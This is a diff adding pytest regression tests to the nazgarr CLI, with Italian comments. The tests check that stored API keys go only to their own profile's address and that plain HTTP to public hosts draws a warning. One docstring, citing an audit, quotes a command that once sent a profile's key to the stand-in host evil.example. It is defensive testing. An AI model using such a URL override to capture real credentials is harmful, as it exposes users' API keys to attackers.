@@ -418,3 +418,65 @@ def test_config_import_explains_a_bad_setting_value(cli_env, client, capsys):
     code, _out, err = run(capsys, "config", "import", str(file), "--yes")
     assert code == 0, err
     assert client.get("/api/settings/rematch_interval_days").json()["value"] == "1.5"
+
+
+def _profiles_file(cli_env):
+    profiles.save("default", {
+        "default": profiles.Profile("default", "http://nas:3019", api_key="KEY-FOR-NAS", key_id=1),
+        "seedbox": profiles.Profile("seedbox", "https://seedbox.example:3019", api_key="KEY-FOR-SEEDBOX", key_id=2),
+    })
+
+
+def test_a_profile_key_goes_only_to_its_own_address(cli_env, monkeypatch):
+    """--url (o NAZGARR_URL) cambiava l'indirizzo ma teneva la chiave del
+    profilo: `nazgarr --url http://evil.example status` la mandava lì
+    (audit 2026-10-18)."""
+    _profiles_file(cli_env)
+    resolved = profiles.resolve(None, "http://evil.example")
+    assert (resolved.url, resolved.api_key) == ("http://evil.example", None)
+    resolved = profiles.resolve(None, "https://SEEDBOX.example:3019/")  # l'indirizzo di un altro profilo
+    assert (resolved.url, resolved.api_key) == ("https://SEEDBOX.example:3019/", "KEY-FOR-SEEDBOX")
+    resolved = profiles.resolve(None, "http://nas:3019/")
+    assert resolved.api_key == "KEY-FOR-NAS"
+    monkeypatch.setenv("NAZGARR_API_KEY", "FROM-ENV")
+    assert profiles.resolve(None, "http://evil.example").api_key == "FROM-ENV"
+
+
+def test_a_chosen_profile_beats_an_inherited_url(cli_env, monkeypatch):
+    """Nel container NAZGARR_URL è sempre http://127.0.0.1:3019: `-P seedbox`
+    mandava la chiave della seedbox all'istanza locale."""
+    _profiles_file(cli_env)
+    monkeypatch.setenv("NAZGARR_URL", "http://127.0.0.1:3019")
+    resolved = profiles.resolve("seedbox", None)
+    assert (resolved.url, resolved.api_key) == ("https://seedbox.example:3019", "KEY-FOR-SEEDBOX")
+    monkeypatch.setenv("NAZGARR_PROFILE", "seedbox")
+    assert profiles.resolve(None, None).url == "https://seedbox.example:3019"
+    monkeypatch.delenv("NAZGARR_PROFILE")
+    # Senza un profilo scelto, NAZGARR_URL vale: senza la chiave di un altro indirizzo.
+    resolved = profiles.resolve(None, None)
+    assert (resolved.url, resolved.api_key) == ("http://127.0.0.1:3019", None)
+    # Un --url scritto sul comando vince anche su un profilo scelto.
+    assert profiles.resolve("seedbox", "http://nas:3019").api_key == "KEY-FOR-NAS"
+
+
+def test_the_environment_url_does_not_override_a_chosen_profile_on_the_command_line(cli_env, client, capsys,
+                                                                                    monkeypatch):
+    _login(capsys)
+    monkeypatch.setenv("NAZGARR_URL", "http://127.0.0.1:3019")
+    code, out, err = run(capsys, "-P", "default", "--json", "status")
+    assert code == 0, err
+    assert json.loads(out)["url"] == URL
+
+
+def test_plain_http_to_a_public_address_is_warned_about(cli_env, monkeypatch, capsys):
+    addresses = {"vps.example": "93.184.216.34", "nas.lan": "192.168.1.10", "box.ts.net": "100.101.102.103",
+                 "127.0.0.1": "127.0.0.1"}
+    monkeypatch.setattr(http.socket, "getaddrinfo", lambda host, *a: [(None, None, None, None, (addresses[host], 0))])
+    http._WARNED.clear()
+    for url in ("http://nas.lan:3019", "http://box.ts.net:3019", "https://vps.example", "http://127.0.0.1:3019"):
+        http.warn_if_insecure(url)
+    assert capsys.readouterr().err == ""
+    http.warn_if_insecure("http://vps.example:3019")
+    http.warn_if_insecure("http://vps.example:3019")  # una volta sola
+    err = capsys.readouterr().err
+    assert err.count("Warning:") == 1 and "public address" in err
